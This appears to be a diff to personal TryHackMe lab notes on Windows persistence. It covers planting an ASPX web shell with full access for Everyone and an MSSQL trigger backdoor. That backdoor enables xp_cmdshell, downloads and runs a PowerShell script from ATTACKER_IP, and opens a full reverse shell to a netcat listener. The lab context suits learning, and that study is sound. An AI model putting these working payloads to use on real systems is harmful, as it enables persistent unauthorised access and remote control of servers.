@@ -261,3 +261,67 @@ yes
 -grab flag
 *THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
 
+---------------------------------------------------------------------------------------------
+
+Persisting Through Existing Services
+
+Using Web Shells
+-uploading web shell to web directory
+-access to iis apppool\defaultapppool
+-has special SeImpersonatePrivilege - easy path to escalation to Admin
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
+-move to victim machine in C:\inetpub\wwwroot
+move shell.aspx C:\inetpub\wwwroot\
+-grant access
+icacls shell.aspx /grant Everyone:F
+-run command from web server
+http://[IP]/shell.aspx
+C:\flag\flag16.exe
+-grab flag
+*THM{EZ_WEB_PERSISTENCE}
+
+Using MSSQL as a Backdoor
+-triggers in MSSQL - bind actions to be performed when specific events occur in the db
+-enable xp_cmdshell - disabled by default
+-open Microsoft SQL Server Mangement Studio 18 - windows authentication
+-New Query
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+-grant access to run xp_cmdshell
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+-change to HRDB database
+UsE HRDB
+-trigger to be configured whenever an INSERT is made into DB
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+-two terminals
+-evilscript.ps1 will be accessed at port 8000
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+-netcat lisener on port 
+nc -lvp 4454
+-grab flag
+
